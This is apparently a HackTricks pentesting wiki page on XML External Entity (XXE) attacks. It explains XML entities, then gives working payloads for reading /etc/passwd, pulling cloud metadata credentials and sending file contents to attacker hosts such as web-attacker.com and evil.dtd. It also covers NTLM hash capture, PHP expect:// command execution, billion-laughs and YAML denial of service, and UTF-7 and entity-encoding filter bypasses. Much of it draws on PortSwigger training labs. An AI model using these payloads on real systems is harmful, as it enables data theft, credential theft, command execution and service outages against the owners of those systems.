# XXE - XEE - XML External Entity

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

An XML External Entity attack is a type of attack against an application that parses XML input.

## XML Basics

**Most of this part was taken from this amazing Portswigger page:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### What is XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.

### What are XML entities? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

### What are XML elements?

Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:

* `<!ELEMENT stockCheck ANY>` Means that any object could be inside the parent `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> Means that it should be empty `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> Declares that `<stockCheck>` can have the children `<productId>` and `<storeId>`

### What is document type definition? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

### What are XML custom entities? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML allows custom entities to be defined within the DTD. For example:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

### What are XML external entities? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML external entities provide the primary means by which [XML external entity attacks](https://portswigger.net/web-security/xxe) arise.

### What are XML Parameter entities?

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

## Main attacks

[Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### New Entity test

In this attack I'm going to test if a simple new ENTITY declaration is working

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](<../.gitbook/assets/image (220).png>)

### Read file

Lets try to read `/etc/passwd` in different ways. For Windows you could try to read: `C:\windows\system32\drivers\etc\hosts`

In this first case notice that SYSTEM "_\*\*file:///\*\*etc/passwd_" will also work.

```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

![](<../.gitbook/assets/image (221).png>)

This second case should be useful to extract a file if the web server is using PHP (Not the case of Portswiggers labs)

```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

In this third case notice we are declaring the `Element stockCheck` as ANY

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

![](<../.gitbook/assets/image (222) (1).png>)

### Directory listing

In **Java** based applications it might be possible to **list the contents of a directory** via XXE with a payload like (just asking for the directory instead of the file):

```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

### SSRF

An XXE could be used to abuse a SSRF inside a cloud

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind SSRF

Using the **previously commented technique** you can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because **XML entities aren't allowed**, in that case you could try using **XML parameter entities**:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### "Blind" SSRF - Exfiltrate data out-of-band

**In this occasion we are going to make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request (for multi-line files you could try to ex-filtrate it via** _**ftp://**_**). This explanation as taken from** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**.**

An example of a malicious DTD to exfiltrate the contents of the `/etc/hostname` file is as follows:

```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
* Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
* Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:\
`http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.

### Error Based(External DTD)

**In this case we are going to make the server loads a malicious DTD that will show the content of a file inside an error message (this is only valid if you can see error messages).** [**Example from here.**](https://portswigger.net/web-security/xxe/blind)

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
* Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
* Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

Invoke the external DTD error with:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

And you should see the contents of the file inside error message of the response of the web server.

![](<../.gitbook/assets/image (223) (1).png>)

_**Please notice that external DTD allows us to include one entity inside the second (****`eval`****), but it is prohibited in the internal DTD. Therefore, you can't force an error without using an external DTD (usually).**_

### **Error Based (system DTD)**

So what about blind XXE vulnerabilities when **out-of-band interactions are blocked** (external connections aren't available)?. [Information from here](https://portswigger.net/web-security/xxe/blind).

In this situation, it might still be possible to **trigger error messages containing sensitive data**, due to a loophole in the XML language specification. If a document's **DTD uses a hybrid of internal and external DTD** declarations, then the **internal DTD can redefine entities that are declared in the external DTD**. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

This means that an attacker can employ the **error-based XXE technique from within an internal DTD**, provided the XML parameter entity that they use is **redefining an entity that is declared within an external DTD**. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an **external DTD file that is local to the application server**. _Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data._

For example, suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`. An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:

```markup
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `local_dtd`, containing the contents of the external DTD file that exists on the server filesystem.
* Redefines the XML parameter entity called `custom_entity`, which is already defined in the external DTD file. The entity is redefined as containing the [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) that was already described, for triggering an error message containing the contents of the `/etc/passwd` file.
*   Uses the `local_dtd` entity, so that the external DTD is interpreted, including the redefined value of the `custom_entity` entity. This results in the desired error message.

    **Real world example:** Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

![](<../.gitbook/assets/image (224).png>)

As this technique uses an **internal DTD you need to find a valid one first**. You could do this **installing** the same **OS / Software** the server is using and **searching some default DTDs**, or **grabbing a list** of **default DTDs** inside systems and **check** if any of them exists:

```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

### Finding DTDs inside the system

In the following awesome github repo you can find **paths of DTDs that can be present in the system**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Moreover, if you have the **Docker image of the victim system**, you can use the tool of the same repo to **scan** the **image** and **find** the path of **DTDs** present inside the system. Read the [Readme of the github](https://github.com/GoSecure/dtd-finder) to learn how.

```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```

### XXE via Office Open XML Parsers

(Copied from [**here**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
Many web applications allow you to upload Microsoft Office documents, and then they parse some details out of them. For example, you might have a web application that allows you to import data by uploading a spreadsheet in XLSX format. At some point, in order for the parser to extract the data from the Spreadsheet, the parser is going to need to **parse at least one XML file**.

The only way to test for this is to generate a **Microsoft Office file that contains an XXE payload**, so let’s do that. First, create an empty directory to unzip your document to, and unzip it!

```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
  inflating: ./unzipped/word/numbering.xml
  inflating: ./unzipped/word/settings.xml
  inflating: ./unzipped/word/fontTable.xml
  inflating: ./unzipped/word/styles.xml
  inflating: ./unzipped/word/document.xml
  inflating: ./unzipped/word/_rels/document.xml.rels
  inflating: ./unzipped/_rels/.rels
  inflating: ./unzipped/word/theme/theme1.xml
  inflating: ./unzipped/[Content_Types].xml
```

Open up `./unzipped/word/document.xml` in your favourite text editor (vim) and edit the **XML to contain your favourite XXE payload**. The first thing I try tends to be a HTTP request, like this:

```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```

Those lines should be inserted in between the two root XML objects, like this, and of course you will need to replace the URL with a URL that you can monitor for requests:

![Those lines should be inserted in between the two root XML objects, like thi](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

All that is left is to **zip the file up to create your evil poc.docx file**. From the “unzipped” directory that we created earlier, run the following:

![From the "unzipped" directory that we created earlier, run the following:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

Now upload the file to your (hopefully) vulnerable web application and pray to the hacking gods for a request in your Burp Collaborator logs.

### Jar: protocol

The `jar` protocol is only available on **Java applications**. It allows to access files inside a **PKZIP** file (`.zip`, `.jar`, ...) and works for local and remote files:

```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```

{% hint style="danger" %}
To be able to access files inside PKZIP files is **super useful to abuse XXE via system DTD files.** Check [this section to learn how to abuse system DTD files](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Behind the scenes

1. It makes an HTTP request to load the zip archive. `https://download.host.com/myarchive.zip`
2. It saves the HTTP response to a temporary location. `/tmp/...`
3. It extracts of the archive.
4. It reads the `file.zip`
5. It delete temporary files.

Note that it's possible to stop the flow in the second step. The trick is to never close the connection when serving the file. [This tools can be useful](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): one in python `slow_http_server.py` and one in java`slowserver.jar`.

Once the server has downloaded your file, you need to find its location by browsing the temp directory. Being random, the file path can't be predict in advance.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Writing files in a temporary directory can help to **escalate another vulnerability that involves a path traversal** (such as local file include, template injection, XSLT RCE, deserialization, etc).
{% endhint %}

### XSS

```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```

### DoS

#### Billion Laugh Attack

```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

#### Yaml Attack

```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

#### Quadratic Blowup Attack

![](<../.gitbook/assets/image (531).png>)

#### Getting NTML

On Windows hosts it is possible to get the NTML hash of the web server user by setting a responder.py handler:

```
Responder.py -I eth0 -v
```

and by sending the following request

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```

Then you can try to crack the hash using hashcat

## Hidden XXE Surfaces

### XInclude

[From here.](https://portswigger.net/web-security/xxe)

Some applications **receive client-submitted data, embed it on the server-side into an XML document, and then parse the document**. An example of this occurs when client-submitted data is placed into a **backend SOAP request**, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because **you don't control the entire XML** document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### SVG - File Upload

[From here.](https://portswigger.net/web-security/xxe)

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to **upload images**, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the **image processing library that is being used might support SVG images**. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```

You could also try to **execute commands** using the PHP "expect" wrapper:

```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

**Note the first line of the read file or of the result of the execution will appear INSIDE the created image. So you need to be able to access the image SVG has created.**

### **PDF - File upload**

Read the following post to **learn how to exploit a XXE uploading a PDF** file:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: From x-www-urlencoded to XML

If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:

```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### Content-Type: From JSON to XEE

To change the request you could use a Burp Extension named “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) you can find this example:

```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

Another example can be found [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Protections Bypasses

### Base64

```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

This only work if the XML server accepts the `data://` protocol.

### UTF-7

You can use the \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.

```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### File:/ Protocol Bypass

If the web is using PHP, instead of using `file:/` you can use **php wrappers**`php://filter/convert.base64-encode/resource=` to **access internal files**.

If the web is using Java you may check the [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Trick from [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
You can create an **entity inside an entity** encoding it with **html entities** and then call it to **load a dtd**.\
Note that the **HTML Entities** used needs to be **numeric** (like \[in this example]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).

```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```

DTD example:

```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```

## PHP Wrappers

### Base64

**Extract** _**index.php**_

```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

#### **Extract external resource**

```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```

### Remote code execution

**If PHP "expect" module is loaded**

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## **SOAP - XEE**

```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## XLIFF - XXE

This section was taken from [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
According to the [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.

### Blind request

```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

The server response with an error:

```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```

But we got a hit on Burp Collaborator.

### Exfiltrating Data via Out of Band

```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

Based on the displayed User Agent returned by burp collaborator, it appears that it is using **Java 1.8**. One of the problems when exploiting XXE on this version of Java is **we’re unable to obtain the files containing a `New Line`** such as `/etc/passwd` using the Out of Band technique.

### Exfiltrating Data via Error Based

DTD File:

```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```

Server Response:

```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```

